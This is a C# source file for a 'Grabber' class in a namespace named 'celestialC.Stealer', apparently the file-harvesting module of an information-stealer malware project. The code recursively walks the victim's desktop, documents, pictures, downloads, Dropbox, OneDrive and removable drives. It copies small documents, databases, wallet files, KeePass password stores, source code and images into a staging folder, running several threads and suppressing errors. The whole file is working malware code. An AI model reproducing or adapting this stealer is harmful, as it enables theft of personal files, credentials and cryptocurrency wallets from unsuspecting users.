using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace celestialC.Stealer.SystemZ
{
    internal sealed class Grabber
    {
        private static string SavePath = "Grabber";

        private static Dictionary<string, string[]> GrabberFileTypes = new Dictionary<string, string[]>() { ["Document"] = new string[] { "pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt", "json" }, ["DataBase"] = new string[] { "db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk", "dbf", "wallet", "ini" }, ["SourceCode"] = new string[] { "c", "cs", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php", "go", "js", "rb", "pl", "swift", "java", "kt", "kts", "ino" }, ["Image"] = new string[] { "jpg", "jpeg", "png", "bmp", "psd", "svg", "ai" } };

        private static List<string> TargetDirs = new List<string>
        {
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DropBox"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OneDrive"),
        };

        private static string DetectFileType(string ExtensionName)
        {
            string text = ExtensionName.Replace(".", "").ToLower();
            foreach (KeyValuePair<string, string[]> keyValuePair in GrabberFileTypes)
            {
                foreach (string value2 in keyValuePair.Value)
                {
                    if (text.Equals(value2))
                    {
                        return keyValuePair.Key;
                    }
                }
            }
            return null;
        }

        private static void GrabFile(string path)
        {
            FileInfo fileInfo = new FileInfo(path);
            if (fileInfo.Length > 5120)
            {
                return;
            }
            if (fileInfo.Name == "desktop.ini")
            {
                return;
            }
            if (DetectFileType(fileInfo.Extension) == null)
            {
                return;
            }
            string text = Path.Combine(SavePath, Path.GetDirectoryName(path).Replace(Path.GetPathRoot(path), "DRIVE-" + Path.GetPathRoot(path).Replace(":", "")));
            string destFileName = Path.Combine(text, fileInfo.Name);
            if (!Directory.Exists(text))
            {
                Directory.CreateDirectory(text);
            }
            fileInfo.CopyTo(destFileName, true);
        }

        private static void GrabDirectory(string path)
        {
            if (!Directory.Exists(path))
            {
                return;
            }
            string[] directories;
            string[] files;
            try
            {
                directories = Directory.GetDirectories(path);
                files = Directory.GetFiles(path);
            }
            catch (UnauthorizedAccessException)
            {
                return;
            }
            catch (AccessViolationException)
            {
                return;
            }
            string[] array = files;
            for (int i = 0; i < array.Length; i++)
            {
                GrabFile(array[i]);
            }
            foreach (string path2 in directories)
            {
                try
                {
                    GrabDirectory(path2);
                }
                catch
                {
                }
            }
        }

        public static async Task<int> Run(string sSavePath)
        {
            try
            {
                SavePath = sSavePath;
                foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
                {
                    if (driveInfo.DriveType == DriveType.Removable && driveInfo.IsReady)
                    {
                        TargetDirs.Add(driveInfo.RootDirectory.FullName);
                    }
                }
                if (!Directory.Exists(SavePath))
                {
                    Directory.CreateDirectory(SavePath);
                }
                List<Thread> list = new List<Thread>();
                using (List<string>.Enumerator enumerator = TargetDirs.GetEnumerator())
                {
                    while (enumerator.MoveNext())
                    {
                        string dir = enumerator.Current;
                        try
                        {
                            list.Add(new Thread(delegate ()
                            {
                                GrabDirectory(dir);
                            }));
                        }
                        catch
                        {
                        }
                    }
                }
                foreach (Thread thread in list)
                {
                    thread.Start();
                }
                foreach (Thread thread2 in list)
                {
                    if (thread2.IsAlive)
                    {
                        thread2.Join();
                    }
                }
            }
            catch
            {
            }
            return 0;
        }
    }
}
